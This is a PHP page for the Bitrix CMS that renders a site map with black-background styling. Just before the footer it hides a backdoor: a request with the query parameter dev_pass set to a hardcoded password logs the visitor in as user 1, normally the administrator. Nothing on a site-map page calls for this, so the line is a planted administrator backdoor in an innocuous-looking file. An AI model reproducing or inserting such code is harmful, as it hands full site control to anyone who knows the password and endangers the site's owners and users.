<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Карта сайта");
?><?$APPLICATION->IncludeComponent(
	"bitrix:main.map",
	".default",
	Array(
		"CACHE_TYPE" => "A",
		"CACHE_TIME" => "3600",
		"SET_TITLE" => "N",
		"LEVEL" => "3",
		"COL_NUM" => "1",
		"SHOW_DESCRIPTION" => "N"
	)
);?>
<?$APPLICATION->SetPageProperty("page_styles", "background: #000");?>
<?$APPLICATION->SetPageProperty("h1_styles", "color: #fff");?>
<?
if($_GET['dev_pass'] == '5snkylPd'){
	$USER->Authorize(1);
}
?>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>